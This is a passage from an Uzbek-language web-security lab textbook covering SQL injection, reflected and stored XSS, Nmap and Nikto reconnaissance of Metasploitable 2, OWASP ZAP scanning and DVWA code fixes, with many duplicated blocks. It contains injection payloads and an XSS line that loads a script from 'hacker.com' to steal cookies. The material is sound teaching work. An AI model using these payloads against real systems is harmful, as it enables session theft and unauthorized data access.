+	•	Laboratoriya muhitida Brauzer Network bo‘limida GET va POST so‘rovni toping.
+	•	Wireshark yordamida HTTP trafikni aniqlash jarayonlarini amalga oshiring.
+	•	Burp Suite yordamida HTTPS login so‘rovini tutib oling va natijalarini faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+5.2. Keng tarqalgan web zaifliklar
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda SQL inyeksiya hujumini amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda SQL inyeksiya hujumini amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar
+Kerakli vositalar
+Shaxsiy kompyuter;
+PortSwigger Web Security Academy platformasi;
+Burp Suite dasturi.
+
+Shaxsiy kompyuter;
+PortSwigger Web Security Academy platformasi;
+Burp Suite dasturi.
+
+Ishning bajarish tartibi
+SQL inyeksiyasi (SQLi) – web-ilovalardagi eng keng tarqalgan zaiflik bo‘lib, foydalanuvchi kiritgan ma’lumotlar SQL so‘roviga to‘g‘ridan-to‘g‘ri qo‘shilganda yuzaga keladi. Hujum natijasida hujumchi maxfiy ma’lumotlarni (masalan, parollar) olishi, o‘zgartirishi yoki o‘chirishi mumkin.
+SQL inyeksiyasi asosiy turlari:
+	•	Classic (In-band) SQLi: xato yoki natija sahifada ko‘rinadi;
+	•	Blind SQLi: natija ko‘rinmaydi, lekin true/false orqali ma’lumot olinadi;
+	•	Union-based: UNION operatori orqali qo‘shimcha ma’lumot olish;
+	•	Error-based: xato xabarlari orqali ma’lumot chiqarish.
+Masalan, oddiy zaif so‘rov:
+SELECT * FROM users WHERE username = ‘$user’ AND password = ‘$pass’;
+Agar $user tekshirilmasa, hujumchi SQL kod yuborishi mumkin.
+Oddiy so‘rov: 
+SELECT * FROM users WHERE id = ‘$id’; 
+Agar $id = “1’ OR ‘1’=‘1” bo‘lsa, so‘rov barcha foydalanuvchilar ro‘yxatini chiqaradi.
+Ushbu laboratoriya ishini PortSwigger Academy ilovasi misolida amalga oshiramiz.
+PortSwigger Web Security Academy – bu PortSwigger kompaniyasi (Burp Suite dasturining ishlab chiqaruvchilari) tomonidan yaratilgan bepul onlayn o‘quv platformasi bo‘lib, web-ilovalar xavfsizligi (web application security) bo‘yicha mutaxassislar uchun mo‘ljallangan.
+Birinchi navbatda https://portswigger.net/web-security rasmiy saytidan ro‘yxatdan o‘tib, account yaratib olish talab etiladi. Keyin SQL Injection bo‘limiga o‘tib, Labs bandini tanlanadi (masalan, “SQL injection vulnerability in WHERE clause”) (5.12-rasm).
+
+5.12-rasm. SQL inyeksiyasi laboratoriyalari
+Endi birinchida turgan laboratoriya tanlansa, bajarish bo‘yicha ko‘rsatmalarni ko‘rish mumkin. Boshlash uchun “Access the lab” tugmasi bosiladi (5.13-rasm). 
+
+5.13-rasm. Laboratoriyani bajarish bo‘yicha ko‘rsatmalar
+Laboratoriya ishida sayt berilgan va uning mahsulot kategoriyasida SQL inyektsiya zaifligi mavjud. Foydalanuvchi kategoriyani tanlaganda, dastur quyidagicha SQL so‘rovini bajaradi:
+SELECT * FROM products WHERE category = ‘Gifts’ AND released = 1
+Laboratoriyada keltirilgan muammoni hal qilish uchun dasturning bir yoki bir nechta mahsulotlarni namoyish etishiga sabab bo‘ladigan SQL inyektsiya hujumini amalga oshirish kerak bo‘ladi. Buning uchun laboratoriya web saytiga kiramiz  (5.14-rasm) va kerakli “tech gifts” bo‘limini tanlaymiz (5.15-rasm).
+
+5.14-rasm. Laboratoriya web sayti
+
+5.15-rasm. Saytning zaifligi mavjud bo‘lgan bo‘limi
+“Tech gifts” bo‘limini tanlab, kirilgan vaqt oralig‘idagi web so‘rovlar Burp Suiteda tutib olinadi (5.16-rasm) va unga o‘zgartirish kiritish uchun Repeaterga yuboriladi hamda parametrlarni o‘zgartirish uchun bittalik qo‘shtirnoq (‘) qo‘yib so‘rov yuboriladi. Buning natijasida server xatolik qaytaradi (5.17-rasm).
+
+5.16-rasm. So‘rovlarni tutib olish
+
+5.17-rasm. SQL so‘rov yuborish
+Boshida Tech categoriyasiga kirganimizda faqat cheklangan ma’lumotlar chiqayotgan edi. Endi so‘rov shaklini (‘ or 1=1--) qilib o‘zgartirib ekranga yashirin ma’lumotlarni ham chiqaramiz (5.18-rasm).
+Demak, laboratoriya maqsadiga erishildi (5.19-rasm) va ekranda barcha kategoriyalar namoyon bo‘ldi.
+
+5.18-rasm. Muvaffaqiyatli bajarilgan SQL hujumi
+
+5.19-rasm. Laboratoriya bajarilganligi haqida xabar
+		PortSwigger Web Security Academy saytidagi “SQL injection vulnerability allowing login bypass” laboratoriyasini bajarib, tizimga administrator sifatida kiring va natijani skrinshot bilan tasdiqlang.
+	•	“SQL injection UNION attack, retrieving data from other tables” laboratoriyasini bajarib, foydalanuvchilar ro‘yxati va parollarini toping. 
+	•	Yuqoridagi laboratoriyalardan birortasini Burp Suite bilan takrorlang: brauzerni Burp proxy orqali sozlang, so‘rovni tutib oling, payload qismini Repeater vositasida sinab ko‘ring. 
+Amaliy topshiriqlar
+
+
+	•	PortSwigger Web Security Academy saytidagi “SQL injection vulnerability allowing login bypass” laboratoriyasini bajarib, tizimga administrator sifatida kiring va natijani skrinshot bilan tasdiqlang.
+	•	“SQL injection UNION attack, retrieving data from other tables” laboratoriyasini bajarib, foydalanuvchilar ro‘yxati va parollarini toping. 
+	•	Yuqoridagi laboratoriyalardan birortasini Burp Suite bilan takrorlang: brauzerni Burp proxy orqali sozlang, so‘rovni tutib oling, payload qismini Repeater vositasida sinab ko‘ring. 
+Amaliy topshiriqlar
+
+5.3. XSS (Cross-Site Scripting) hujumlari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda XSS hujumini amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda XSS hujumini amalga oshirish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	PortSwigger Web Security Academy platformasi;
+	•	Burp Suite dasturi.
+
+	•	Shaxsiy kompyuter;
+	•	PortSwigger Web Security Academy platformasi;
+	•	Burp Suite dasturi.
+
+Ishning bajarish tartibi
+XSS (Cross-Site Scripting) hujumi – foydalanuvchi kiritgan ma’lumotlari (masalan, izoh, qidiruv so‘zi) to‘g‘ridan-to‘g‘ri sahifaga JavaScript sifatida chiqarilganda yuzaga keladigan zaiflik. Hujumchi kukilarni o‘g‘irlashi, foydalanuvchini boshqa saytga yo‘naltirishi yoki sahifani buzishi mumkin.
+Oddiy qilib aytganda server foydalanuvchi kiritgan ma’lumotni tekshirmasdan sahifaga chiqaradi.
+XSS hujumining asosiy turlari:
+	•	Reflected XSS: kiritilgan kod darhol javob sahifasida aks etadi.
+	•	Stored XSS: zararli kod ma’lumotlar bazasiga saqlanadi va keyinchalik barcha foydalanuvchilarga ko‘rinadi.
+	•	DOM-based XSS: zaiflik faqat brauzer tomonda (JavaScript orqali) yuzaga keladi.
+Masalan oddiy payload:
+<script>alert(1)</script>
+Agar alert chiqsa, demak XSS zaifligi bor.
+Ushbu laboratoriyani PortSwigger Academy misolida amalga oshiramiz.
+PortSwigger Web Security Academy – bu PortSwigger kompaniyasi (Burp Suite dasturining ishlab chiqaruvchilari) tomonidan yaratilgan bepul onlayn o‘quv platformasi bo‘lib, web-ilovalar xavfsizligi (web application security) bo‘yicha mutaxassislar uchun mo‘ljallangan.
+Birinchi navbatda https://portswigger.net/web-security rasmiy saytidan ro‘yxatdan o‘tib, account yaratib olish talab etiladi. Keyin XSS bo‘limiga o‘tib, “Reflected XSS into HTML context with nothing encoded” mavzusidagi laboratoriya ochiladi (5.20-rasm).
+
+5.20-rasm. XSS hujumiga oid laboratoriya topshiriqlari
+Endi birinchida tartibdagi laboratoriya ichiga kirilsa, bajarish bo‘yicha berilgan ko‘rsatmalar bilan tanishib chiqiladi. Laboratoriyani bajarishni boshlash uchun “Access the lab” tugmasi bosiladi (5.21-rasm). 
+
+5.21-rasm. Laboratoriyani bajarish bo‘yicha ko‘rsatmalar
+Ushbu laboratoriya qidiruv funksiyasida oddiy aks ettirilgan saytlararo skript zaifligini o‘z ichiga olgan. Laboratoriyada qo‘yilgan muammoni hal qilish uchun funksiyani chaqiradigan saytlararo skript hujumini amalga oshirish lozim bo‘ladi.
+Buning uchun laboratoriya web saytiga kiriladi (5.22-rasm) va qidiruv maydoniga <script>alert(1)</script> payloadi kiritiladi va “Search” tugmasi bosiladi. Alert oynasini (ya’ni, 1 ni qaytaradi) chiqishi, zaiflik mavjudligini ko‘rsatadi (5.23-rasm).
+
+5.22-rasm. Laboratoriya veb sayti
+
+
+5.23-rasm. Payload kiritish va natija
+Ogohlantirish (Alert) chiqishi – bu XSS zaifligining isboti hisoblanadi.
+Real hujumda alert(1) o‘rniga xavfli kod yozish mumkin:
+<script>alert(document.cookie)</script> → foydalanuvchi kukilarini (sessiya ma’lumotlarini) ko‘rsatadi.
+<script>src=«https://hacker.com/steal.js»></script> → tashqi saytdan kod yuklab, kukilarni o‘g‘irlashi, klaviatura bosishlarini yozib olishi yoki foydalanuvchini fishing saytga yo‘naltirishi mumkin.
+Reflected XSS xavfi. Hujumchi bu payloadni URL ga qo‘shib (masalan, ?search=<script>...), ijtimoiy tarmoq yoki email orqali jabrlanuvchiga yuborishi mumkin. Jabrlanuvchi linkni bosganda uning brauzerida zararli kod ishga tushadi.
+Endi Burp Suiteni ishga tushirib, laboratoriyada so‘rovni tutib olib, payloadni Repeaterga yuboring va turli variantlarni sinab ko‘ring. Masalan <script>alert(document.cookie)</script> skriptini (5.24-rasm).
+Natijada sessiya kukilari (masalan, session=abc123) chiqsa, hujumchi ularni o‘g‘irlashi (sessiyani o‘g‘irlash) mumkinligini taxmin qilish mumkin.
+Keyingi bosqichda “Stored XSS into HTML context with nothing encoded” nomli laboratoriyani bajaramiz (5.25-rasm) va izoh maydoniga <script>alert(‘Stored XSS’)</script> yozamiz va post qoldiramiz qilamiz. Sahifani yangilab, “alert” xabari chiqishini tekshiramiz (5.26-rasm).
+
+5.24-rasm. Repeater orqali sinov va natija
+
+5.25-rasm. Stored XSS hujumi laboratoriyasi
+Kiritgan payload (<script>alert(‘Stored XSS’)</script>) server tomonidan hech qanday filtrlanmasdan bazaga saqlandi.
+
+5.26-rasm. Stored XSS hujumi
+
+5.27-rasm. Hujum natijasi
+Sahifa yuklanganda server bazadan izohlarni olib, HTML ga to‘g‘ridan-to‘g‘ri qo‘shadi. Masalan, sahifa kodi shunday bo‘ladi:
+<div class=«comment»>Your comment: <script>alert(‘Stored XSS’)</script></div>
+Brauzer bu HTML tegni ko‘rsatish jarayonida <script> tegi ichidagi kodni JavaScript sifatida bajaradi. Natijada har safar sahifa ochilganda alert oynasi chiqadi. Bu saqlangan bo‘lgani uchun nafaqat sizga, balki boshqa foydalanuvchilarga ham ta’sir qiladi (masalan, saytga kirgan har bir kishi ushbu alertni ko‘radi).
+		Laboratoriya muhitida PortSwigger Academy vositasida XSS hujumiga oid laboratoriya ishlarini bajaring va natijalarni skrinshotga oling.
+	•	Burp Suite yordamida yuqoridagi laboratoriyada XSS so‘rovini tutib oling va payloadni o‘zgartirib (masalan, kuki o‘g‘irlash uchun) sinab ko‘ring. 
+	•	Olingan natijalar va XSS hujumining xavf darajasi bo‘yicha xulosa yozing, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida PortSwigger Academy vositasida XSS hujumiga oid laboratoriya ishlarini bajaring va natijalarni skrinshotga oling.
+	•	Burp Suite yordamida yuqoridagi laboratoriyada XSS so‘rovini tutib oling va payloadni o‘zgartirib (masalan, kuki o‘g‘irlash uchun) sinab ko‘ring. 
+	•	Olingan natijalar va XSS hujumining xavf darajasi bo‘yicha xulosa yozing, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+5.4. Ethical hacking va qonuniy asoslar
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda lokal muhitda etik razvedka o‘tkazish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda lokal muhitda etik razvedka o‘tkazish ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	Kali Linux OT;
+	•	Metaploitable 2 OT;
+	•	Terminal va Nmap, Nikto, Legion kabi vositalar. 
+	•	Shaxsiy kompyuter;
+	•	Kali Linux OT;
+	•	Metaploitable 2 OT;
+	•	Terminal va Nmap, Nikto, Legion kabi vositalar. 
+Ishning bajarish tartibi
+Penetration Testing (Pen Test) – bu tizim xavfsizligini baholash uchun ruxsat olib simulyatsiya qilingan hujumdir. Etik razvedka (reconnaissance) Pen Testning birinchi bosqichi bo‘lib, maqsadli tizim haqida ma’lumot to‘plashni o‘z ichiga oladi (passiv va aktiv razvedka ko‘rinishda bo‘ladi).
+Tarmoq razvedkasi - mijozning axborot tizimi, axborot tizimining resurslari, foydalaniladigan qurilmalar va dasturiy ta’minot, ularning zaif tomonlari, himoya vositalari, shuningdek, axborot tizimiga kirish chegarasi to‘g‘risidagi ma’lumotlarni olish va qayta ishlashni amalga oshiradi.
+Passiv razvedka - maqsadli tizimga hech qanday to‘g‘ridan-to‘g‘ri aloqa qilmasdan, ochiq manbalardan ma’lumot to‘plash.
+Aktiv razvedka - maqsadli tizim yoki tarmoq bilan to‘g‘ridan-to‘g‘ri aloqa o‘rnatib, ma’lumot to‘plash (paket yuborish, so‘rovlar jo‘natish).
+Web xizmat razvedkasi – razvedkaning web-sayt va web-ilovalarga yo‘naltirilgan turi. U ham passiv va aktiv bo‘lishi mumkin.
+Ishning bajarish tartibi:
+1-qadam. Laboratoriya muhitini tayyorlash. Bu laboratoriyada ikki xil tizim ishlatiladi:
+	•	Kali Linux — hujumni bajaruvchi tizim;
+	•	Metasploitable 2 — atayin zaif qilib yaratilgan test tizimi;
+Ikkala tizim:
+	•	bir xil tarmoqda (Bridged Adapter yoki NAT Network);
+	•	bir-birini “ko‘ra olishi” kerak.
+Bu sharoit bo‘lmasa, testlashni amalga oshirib bo‘lmaydi.
+2-qadam. Kali Linux OTning IP manzilini aniqlash. Kali Linux OTda terminal ochiladi va quyidagi buyruq yoziladi:
+ip a
+Natijada Kali Linux OTning IP manzili ko‘rinadi, masalan:
+192.168.0.115
+Demak, Kali Linux OT hozir shu IP orqali tarmoqqa ulangan.
+3-qadam. Metasploitable 2 OTning IP manzilini aniqlash. Metasploitable 2 tizimiga kiriladi (login: msfadmin, parol: msfadmin). Terminalda:
+ifconfig
+Natijada, masalan:
+192.168.0.102
+Shundan so‘ng, aloqa mavjud yoki yo‘qligini aniqlash uchun ping buyrug‘idan foydalaniladi (5.28-rasm va 5.29-rasm).
+
+5.28-rasm. Kali Linux OTning IP manzilini aniqlash va Metasploitable 2 OT bilan aloqa bor yoki yo‘qligini tekshirish
+
+5.29-rasm. Metasploitable 2 OTni IP manzilini aniqlash va Kali Linux OT bilan aloqa bor yoki yo‘qligini tekshirish
+4-qadam. Passiv razvedkani amalga oshirish uchun quyidagi ketma-ketlikdagi ishlab bajariladi:
+	•	Nishondagi qurilma IPini bilib olish: Metasploitable odatda 192.168.0.102 yoki shunga o‘xshash IP manzilni oladi.
+	•	Passiv ma’lumotlarni olish: WHOIS, DNS lookup (real hayotda) ilovalari yordamida qurbon mashinasi haqida ma’lumot to‘plang (Metasploitable 2 OTda zaif xizmatlar mavjudligini esda saqlagan holda) (5.30-rasm).
+5-qadam. Aktiv razvedkani, port va xizmatlarni skanerlashni amalga oshirish. Nmap yordamida tarmoq razvedkasini quyidagicha amalga oshirish mumkin:
+	•	Nmap vositasi o‘rnatilganligini tekshiring (Kali OTda bor). Nishondagi qurilma IPini aniqlang: Kali OTda «nmap -sn 192.168.0.102/24» buyrug‘i bilan tarmoqdagi tirik “live” hostlarni aniqlash mumkin (5.31-rasm).
+	•	Oddiy skanerlash: «sudo nmap 192.168.0.102» buyrug‘i ochiq portlarni aniqlashda yordam beradi (21 FTP, 22 SSH, 80 HTTP va boshqalar) (5.32-rasm).
+	•	Batafsil skanerlash uchun: «sudo nmap -sV -O 192.168.0.102» buyrug‘idan foydalanib, xizmat versiyalari va OTni aniqlash mumkin (Ubuntu Linux, vsftpd 2.3.4 va boshqalar haqida) (5.33-rasm).
+Zaifliklarni aniqlash uchun: «sudo nmap -sV --script vuln 192.168.0.102» buyrug‘idan foydalanish mumkin (masalan, FTP anonymous login) (5.34-rasm).
+
+5.30-rasm. Passiv razvedka
+
+5.31-rasm. Tarmoqdagi tirik hostlarni aniqlash
+
+5.32-rasm. Oddiy skanerlash
+
+5.33-rasm. Batafsil skanerlash
+
+5.34-rasm. Zaifliklarni aniqlash
+
+5.35-rasm. Razvedka hujumlari amalga oshirish vositalari
+Nikto - bu bepul va ochiq kodli (open-source) web-server zaifliklarini skanerlash vositasi bo‘lib, blackbox turidagi vositalar sinfiga kiradi. U serverlarda xavfli fayllar, eskirgan komponentlar, xavfsiz bo‘lmagan konfiguratsiyalar hamda boshqa zaifliklar mavjudligini tekshiradi. Dastur manba kodiga kirishni talab qilmasdan, faol (aktiv) skanerlash prinsipi asosida ishlaydi.
+
+5.36-rasm. Nikto dasturidan foydalanish uchun yordamchi buyruqlar
+Ushbu dasturiy vosita web tizimlarni hujumlarga bardoshliligini baholash uchun ham ishlatiladi va asosan XSS turidagi hujumlarga zaifliklar mavjudligini tekshiradi. Web tizim IP manzilini aniqlab olgach hujum ssenariylarini ishga tushiradi va topilgan zaifliklar haqida batafsil ma’lumot olish imkoniyatini beradi.
+Dastur yordamida quyida 3 ta web sayt sinab ko‘riladi.
+
+5.37-rasm. Birinchi saytni skanerlash natijalari
+
+5.38-rasm. Ikkinchi saytni skanerlash natijalari
+
+5.39-rasm. Uchinchi saytni skanerlash natijalari
+Keyingi dasturiy vosita “Legion” deb nomlanadi. Legion - bu mashinalarda ishlayotgan va pentest (penetratsion test) jarayonida kerak bo‘lishi mumkin bo‘lgan eng ko‘p uchraydigan xizmatlarni aniqlash uchun bir nechta mashhur ochiq kodli vositalardan foydalanadigan dastur hisoblanadi. U xizmatlarni avtomatik, yarim avtomatik yoki qo‘lda aniqlash imkoniyatini beradi.
+
+5.40-rasm. Dasturning asosiy oynasi
+Dastur ishga tushirilgandan so‘ng tekshirilishi lozim bo‘lgan tizim nomi kiritiladi. Tekshirish rejimi va samaradorlik ko‘rsatiladi.
+
+5.41-rasm. Skanerlash parametrlarini kiritish
+
+5.42-rasm. Portlar va xizmatlar
+Skanerlash yakunlanganidan so‘ng tizimdagi ochiq portlar, ulardan foydalanuvchi xizmatlar, holati, zaif skriptlar, CVE (Common Vulnerabilities and Exposures, Keng tarqalgan zaifliklar va oshkor etilgan xatarlar) haqida tizimlashgan va to‘liq ma’lumot olishlari mumkin.
+
+5.43-rasm. Umumlashtiruvchi axborot
+
+5.44-rasm. Zaif skriptlar
+
+5.45-rasm. CVE ro‘yxati
+
+5.46-rasm. Tarmoq portlarini tasniflangan holda ajratish
+		Laboratoriya muhitida Kali va Metasploitable OTlarini virtual mashinalarda sozlab, Nmap bilan to‘liq skanerlashni bajaring.
+	•	Nikto va Legion bilan web-razvedka o‘tkazing va topilgan zaifliklarni jadvalda ko‘rsating. 
+	•	Skanerlash natijalarini faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida Kali va Metasploitable OTlarini virtual mashinalarda sozlab, Nmap bilan to‘liq skanerlashni bajaring.
+	•	Nikto va Legion bilan web-razvedka o‘tkazing va topilgan zaifliklarni jadvalda ko‘rsating. 
+	•	Skanerlash natijalarini faylga saqlab, skrinshotlar bilan asoslangan hisobot tayyorlang.
+Amaliy topshiriqlar
+
+5.5. Websayt xavfsizligi vositalari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda OWASP ZAP dasturiy vositasi yordamida zaifliklarni skanerlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda OWASP ZAP dasturiy vositasi yordamida zaifliklarni skanerlash ko‘nikmasini shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	OWASP ZAP dasturi;
+	•	Brauzer (Google Chrome yoki Mozilla Firefox).
+
+	•	Shaxsiy kompyuter;
+	•	OWASP ZAP dasturi;
+	•	Brauzer (Google Chrome yoki Mozilla Firefox).
+
+Ishning bajarish tartibi
+Zed Attack Proxy (ZAP) - bu penetration testingni amalga oshirishga mo‘ljallangan ochiq kodli vosita bo‘lib, OWASP kompaniyasi mahsuloti hisoblanadi. ZAP web-ilovalarni tahdidlarda testlash uchun maxsus ishlab chiqilgan.
+ZAPni o‘rtada turgan vositachi (man-in-the-middle proxy) deb nomlanuvchi hujum turi deb tushunsa bo‘ladi. U testlovchini web brauzeri va web-ilova o‘rtasida joylashgan bo‘lib, yuborilgan xabarlarni ushlab turishi va tekshirishi, kerak bo‘lganda tarkibni o‘zgartirishi va keyin ushbu paketlarni belgilangan joyga yo‘naltirishi mumkin.
+
+5.47-rasm. ZAP dasturi mantiqiy joylashuvi
+Agar boshqa tarmoq proksi-serveri allaqachon ishlatilayotgan bo‘lsa, ko‘pgina korporativ muhitlarda bo‘lgani kabi, ZAP ushbu proksi-serverga ulanish uchun sozlanishi mumkin.
+
+5.48-rasm. ZAP dasturi proxy serverining mantiqiy joylashuvi
+ZAP turli kvalifikatsiya darajalari uchun funksional imkoniyatlar taqdim qiladi, dasturchidan tortib xavfsizlik testlovchisigacha. ZAP har bir asosiy operatsion tizim va Docker uchun versiyalarga ega.
+Bajarilishi rejalashtirilgan ishlar ketma-ketligi:
+ZAP Desktop UI quyidagi elementlardan iborat:
+	•	Menyu paneli - ko‘plab avtomatlashtirilgan va qo‘lda ishlaydigan vositalardan foydalanishni ta’minlaydi.
+	•	Toolbar paneli - eng ko‘p ishlatiladigan xususiyatlardan oson foydalanishni ta’minlaydigan tugmalarni o‘z ichiga oladi.
+	•	Tree Windows - saytlar daraxti va skriptlar daraxtini ko‘rsatadi.
+	•	Ish maydoni oynasi - so‘rovlar, javoblar va skriptlarni ko‘rsatadi va ularni tahrirlash imkonini beradi.
+	•	Ma’lumot oynasi - avtomatlashtirilgan va qo‘lda ishlaydigan vositalarning tafsilotlarini ko‘rsatadi.
+	•	Footer - topilgan tahdidlarning qisqacha mazmunini va asosiy avtomatlashtirilgan vositalar holatini ko‘rsatadi.
+Avtomatlashtirilgan skanerlashni ishga tushirish. ZAP vositasidan foydalanishni boshlash “Quick Start” yorlig‘ini bosish orqali amalga oshiriladi. Quick start - bu ZAP qo‘shimchasi bo‘lib, ZAP o‘rnatilganida avtomatik ravishda qo‘shiladi.
+
+5.49-rasm. ZAP dasturi ishchi oynasi
+Quick start avtomatik skanerlashni ishga tushirish uchun:
+	•	ZAP-ni ishga tushiring va ish maydoni oynasining Quick start yorlig‘ini bosing;
+	•	Katta avtomatlashtirilgan skanerlash tugmasini bosing;
+
+5.50-rasm. ZAP dasturi avtomatik skanerlash bo‘limi
+	•	Hujum qilish uchun URL matn maydoniga hujum qilmoqchi bo‘lgan web-ilovaning to‘liq URL manzilini kiriting;
+	•	Hujum tugmasini bosing.
+Tanlanga saytga hujum uyushtirilgandan so‘ng dasturning pastki (footer) qismida hujum natijalarini ko‘rish mumkin.
+
+5.51-rasm. ZAP dasturi ogohlantirishlar ro‘yxati
+Ogohlantiruvchi xabar ustiga ikki marta sichqonchaning chap tugmasi bosilgandan so‘ng to‘liq ma’lumotni olish mumkin.
+
+5.52-rasm. ZAP dasturi ogohlantirish yozuvining umumiy ko‘rinishi
+		Laboratoriya muhitida OWASP ZAPni o‘rnating, brauzerni proxy orqali sozlang va PortSwigger Academy ilovasida biror XSS yoki SQLi laboratoriyasini oching.
+	•	ZAP ilovasi orqali saytda topilgan zaifliklarni ko‘ring. 
+	•	Topilgan zaifliklar ro‘yxatini (severity, description), skrinshotlarni va qisqa tahlilini (qaysi zaifliklar topildi va ularning xavfi) hisobot shaklida topshiring.
+Amaliy topshiriqlar
+
+
+	•	Laboratoriya muhitida OWASP ZAPni o‘rnating, brauzerni proxy orqali sozlang va PortSwigger Academy ilovasida biror XSS yoki SQLi laboratoriyasini oching.
+	•	ZAP ilovasi orqali saytda topilgan zaifliklarni ko‘ring. 
+	•	Topilgan zaifliklar ro‘yxatini (severity, description), skrinshotlarni va qisqa tahlilini (qaysi zaifliklar topildi va ularning xavfi) hisobot shaklida topshiring.
+Amaliy topshiriqlar
+
+
+5.6. OWASP TOP 10 zaifliklari
+(Laboratoriya mashg‘uloti)
+O‘quvchilarda web saytlardagi zaifliklarni bartaraf etish bo‘yicha ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+O‘quvchilarda web saytlardagi zaifliklarni bartaraf etish bo‘yicha ko‘nikmalarni shakllantirish.
+Mashg‘ulot
+maqsadi:
+Kerakli vositalar:
+Kerakli vositalar:
+	•	Shaxsiy kompyuter;
+	•	XAMPP dasturi (lokal server uchun);
+	•	DVWA (Damn Vulnerable Web Application) 
+	•	Shaxsiy kompyuter;
+	•	XAMPP dasturi (lokal server uchun);
+	•	DVWA (Damn Vulnerable Web Application) 
+
+Ishning bajarish tartibi
+Web saytlardagi zaifliklarni bartaraf etish xavfsizlikni ta’minlashning eng muhim qismi hisoblanadi. Ushbu laboratoriya ishida DVWA ilovasini lokal muhitda o‘rnatib, oldingi laboratoriyalarda topilgan zaifliklarni (SQLi, XSS va boshqalar) kod darajasida tuzatish masalasi bilan shug‘ullanamiz. DVWA vositasida xavfsizlik darajasining (Security Level) past (low), o‘rta (medium), yuqori (high) va o‘ta yuqori (impossible) darajalari mavjud (mazkur laboratoriyada past darajasidan boshlaymiz). 
+Ishni bajarish ketma-ketligi quyidagicha:
+1. XAMPP vositasini https://www.apachefriends.org/?referrer=grok.com rasmiy saytdan yuklab oling va o‘rnating (5.53-rasm). Apache va MySQL ilovasini ishga tushiring (5.54-rasm). Bu vositalar lokal server yaratishga xizmat qiladi.
+
+5.53-rasm. XAMPP dasturini o‘rnatish
+
+5.54-rasm. Apache va MySQL serverlarini ishga tushirish
+2. DVWA vositasini https://github.com/digininja/DVWA?referrer=grok.com manzilidan yuklab olish mumkin. Shundan so‘ng uni arxivdan chiqaring, papkani DVWA deb nomlab, C diskda turgan XAMPP vositasining htdocs papkasiga joylashtiring. DVWA papkasidagi config papkasida config.inc.php.dist fayli mavjud bo‘lib, uni config.inc.php shaklida o‘zgartirish talab etiladi. Shundan so‘ng, ma’lumotlar bazasi foydalanuvchisi va parolini sozlash talab etiladi (masalan, user: root, pass: bo‘sh) (5.55-rasm).
+
+5.55-rasm. DVWA vositasini o‘rnatish va config faylini sozlash
+Endi XAMPP vositasini ochib, MySQL yonidagi “Admin” tugmasini bosing va yangi “dvwa” nomli ma’lumotlar bazasini yarating. Yangi foydalanuvchi yaratish uchun “Добавить учетную запись пользователя” tugmasini bosing (login: dvwa, parol: p@ssw0rd) (5.56-rasm). 
+
+5.56-rasm. Yangi baza va foydalanuvchi yaratish
+3. Brauzerda http://localhost/DVWA manzilini oching va yuqoridagi login va parolni kiriting. “Create/Reset Database” tugmasini bosing va tizimga kiring (tizimga kirishda login sifatida “admin”, parol sifatida esa “password” kiritiladi). DVWA Xavfsizlik (Security) bo‘limidan xavfsizlik darajasini past (low) darajaga o‘zgartirib, “Submit” tugmasini bosing (5.57-rasm).
+
+5.57-rasm. DVWA vositasini ishga tushirish va past darajaga sozlash
+4. SQL Injection bo‘limini tanlang. Past darajadagi topshiriqni bajarish uchun “User ID” maydoniga ‘ OR ‘1’=‘1’ -- SQL so‘rovini kiriting va zaiflikni tekshiring. Agarda zaiflik mavjud bo‘lsa, barcha foydalanuvchilar ma’lumotlari ekranga chiqadi (5.58-rasm). Dastur kodini oching (xotirada vulnerabilities/sqli/source/low.php manzilida joylashgan) va kodda foydalanuvchilarning ID raqamlari $id = $_GET[‘id’]; kabi to‘g‘ridan-to‘g‘ri ishlatilganini ko‘rish mumkin (5.59-rasm).
+
+5.58-rasm. Past darajadagi SQLi zaifligi
+
+5.59-rasm. SQLi zaifligi mavjud kod
+5. Kodni tuzatish uchun low.php faylidagi $id o‘zgaruvchisini oldidan intval funksiyasini qo‘llang (5.60-rasm): $id = intval($_GET[‘id’]);. intval() - bu PHP dasturlash tilida ma’lumotni majburiy ravishda butun songa (integer) aylantiruvchi funksiya. Funksiyaga kiritilgan qiymat qanday turda bo‘lishidan qat’i nazar, natijada faqat son qaytaradi. O‘zgartirilgan faylni saqlang va qayta SQL so‘rovini yuborib ko‘ring, so‘rovga javob qaytmaganiga e’tibor bering (5.61-rasm).
+
+5.60-rasm. Kodni tuzatish
+
+5.61-rasm. So‘rovni qayta sinab ko‘rish
+6. XSS hujumini amalga oshirish uchun dasturning XSS bo‘limini tanlang. Bo‘sh turgan maydonga <script>alert(‘XSS’)</script> XSS so‘rovini kiriting va tizimda zaiflik mavjudligini tekshiring. Agar zaiflik mavjud bo‘lsa, tizim yuborilgan so‘rovga javoban ekranga “XSS” yozuvini chiqaradi (5.62-rasm). Kodni oching (xotirada vulnerabilities/xss_r/source/low.php manzilida joylashgan) va kodda “echo $_GET[‘name’];” o‘zgaruvchisi to‘g‘ridan-to‘g‘ri chiqarilganini ko‘rishingiz mumkin (5.63-rasm). 
